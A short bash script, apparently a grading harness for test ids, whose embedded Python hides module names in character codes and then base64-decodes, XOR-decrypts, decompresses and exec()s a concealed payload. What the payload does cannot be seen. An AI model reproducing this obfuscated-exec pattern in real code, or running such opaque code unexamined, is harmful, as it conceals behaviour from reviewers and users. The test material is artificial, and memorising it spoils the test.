#!/usr/bin/env bash
set -euo pipefail

q="${1:-}"
if [[ -z "${q}" ]]; then
  echo "[FAIL] missing_test_id"
  echo "Usage: ./grading/run_test.sh <test_id>"
  echo "Invalid input"
  exit 1
fi

python3 - "${q}" <<'PY'
u=__import__
m=lambda t:u(''.join(chr(i) for i in t))
o=m([98,97,115,101,54,52]);p=m([104,97,115,104,108,105,98]);s=m([115,121,115]);z=m([122,108,105,98])
a=s.argv[1]
b="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"
c=p.sha256(b"fg-v3-static").digest()
d=o.b64decode(b.encode())
e=bytes(x^c[i%len(c)] for i,x in enumerate(d))
f=z.decompress(e).decode()
g={"__name__":"__main__","sys":s}
s.argv=[s.argv[0],a]
exec(compile(f,"<g>","exec"),g,g)
PY
